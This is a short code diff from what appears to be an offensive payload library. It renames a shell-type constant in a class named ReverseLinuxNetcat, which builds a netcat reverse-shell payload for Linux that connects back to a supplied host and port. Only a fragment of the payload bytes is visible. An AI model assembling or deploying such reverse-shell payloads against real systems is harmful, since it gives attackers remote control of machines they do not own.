@@ -14,7 +14,7 @@ class ReverseLinuxNetcat(payloadcore.Payload):
                      b"\x00\x00 >/tmp/f\0"
         super(ReverseLinuxNetcat, self).__init__(
             ref="reverse/linux_netcat", payloadbin=payloadbin,
-            shellname=shellindex.ShellIndex.BASHREVERSE)
+            shellname=shellindex.ShellIndex.BASICREVERSE)
 
     def parseparameters(self, host, port):
         host = host.encode()
